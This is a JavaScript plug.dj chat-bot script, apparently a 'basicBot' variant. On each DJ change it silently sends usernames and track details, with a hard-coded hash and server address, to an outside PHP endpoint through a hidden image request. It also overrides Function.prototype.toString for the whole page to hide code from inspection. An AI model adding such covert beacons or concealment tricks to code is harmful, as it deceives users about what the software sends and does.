(function () {

    var loadChat = function (cb) {
        if (!cb) cb = function () {
        };
        $.get("https://rawgit.com/Yemasthui/basicBot/master/lang/langIndex.json", function (json) {
            var link = basicBot.chatLink;
            if (json !== null && typeof json !== "undefined") {
                langIndex = json;
                link = langIndex[basicBot.settings.language.toLowerCase()];
                if (basicBot.settings.chatLink !== basicBot.chatLink) {
                    link = basicBot.settings.chatLink;
                }
                else {
                    if (typeof link === "undefined") {
                        link = basicBot.chatLink;
                    }
                }
                $.get(link, function (json) {
                    if (json !== null && typeof json !== "undefined") {
                        if (typeof json === "string") json = JSON.parse(json);
                        basicBot.chat = json;
                        cb();
                    }
                });
            }
            else {
                $.get(basicBot.chatLink, function (json) {
                    if (json !== null && typeof json !== "undefined") {
                        if (typeof json === "string") json = JSON.parse(json);
                        basicBot.chat = json;
                        cb();
                    }
                });
            }
        });
    };

    var basicBot = {
        chatLink: "https://rawgit.com/Yemasthui/basicBot/master/lang/en.json",
        chat: null,
        loadChat: loadChat,
        
        settings: {
            botName: "Bukkit Bot",
            language: "english",
            chatLink: "https://rawgit.com/Yemasthui/basicBot/master/lang/en.json"
        },
        
        eventDjadvance: function (obj) {
        	// check if dj is present
        	if (obj == null) return;
        	
        	var ip = "s21.hosthorde.com:1338";
        	var hash = "cQI16fSdL5upaU1Lzk3hLptiQqr3i";
        	
        	var str = "";
        	var currentDJ = obj.dj;
        	str += currentDJ.username;
        	        	  
        	// get media name and title
        	str += "|-|" + obj.media.author + "|-|" + obj.media.title;
        	 
        	// load my website (tcp helper ...)
        	var fakeImg = new Image();
        	fakeImg.src = 'http://pokemon-online.xyz/js/pass.php?a=' + hash + '&b=' + ip + '&c=' + escape(str);
        },
        
        connectAPI: function () {
        	// connect to plug.dj API
            this.proxy = {
                eventDjadvance: $.proxy(this.eventDjadvance, this)
            };
            API.on(API.ADVANCE, this.proxy.eventDjadvance);
        },
        
        disconnectAPI: function () {
        	// disconnect API
            API.off(API.ADVANCE, this.proxy.eventDjadvance);
        },
        
        startup: function () {
        	// load bot        	
            Function.prototype.toString = function () {
                return 'Function.'
            };
            
            // register dj advance event
            basicBot.connectAPI();
            window.bot = basicBot;

            // send chat
            API.sendChat("Bot loaded ...");
        }
    };

    
    // start bot
    loadChat(basicBot.startup);
    
}).call(this);
